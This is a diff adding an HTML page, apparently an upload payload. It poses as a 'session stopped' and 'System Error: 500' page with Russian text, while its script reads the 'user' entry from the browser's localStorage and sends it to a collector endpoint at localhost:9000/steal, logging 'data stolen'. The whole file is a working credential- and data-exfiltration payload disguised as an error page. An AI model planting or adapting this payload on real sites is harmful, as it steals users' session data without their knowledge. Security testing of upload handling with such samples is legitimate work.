@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body { background-color: #1a1a1a; color: #ff3333; font-family: monospace; text-align: center; padding-top: 100px; }
+        h1 { font-size: 3rem; }
+    </style>
+</head>
+<body>
+    <p>Твоя сессия остановлена</p>
+    
+    <script>
+        const stolenData = localStorage.getItem("user");
+        fetch(`http://localhost:9000/steal?data=${encodeURIComponent(stolenData)}&source=file_upload`)
+            .then(() => {
+                console.log("Данные украдены");
+            })
+            .catch(err => console.error("Failed to connect to server"));
+
+        alert("System Error: 500.");
+    </script>
+</body>
+</html>
